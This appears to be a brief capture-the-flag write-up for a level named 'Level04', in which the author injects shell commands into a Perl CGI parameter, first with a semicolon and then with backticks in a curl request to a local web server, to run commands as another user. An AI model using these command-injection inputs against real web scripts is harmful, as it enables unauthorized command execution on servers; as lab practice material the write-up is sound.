# Level04

We have a perl script which runs `echo` on the param `x` given
`./level04.pl x=hello;whoami` -> We try to add more shell commands, it work but it is run as `level04`

Maybe this script is run by the server.
Lets find out: 
`ps aux` -> apache is running
Lets get the config:
`cat /etc/apache2/ports.conf` -> it listens on 80, 4646, 4747
`curl 'localhost:4747/level04.pl?x=`id`'` -> try to curl it, we put it in `` because in perl what is in it is run in shell.
IT WORKS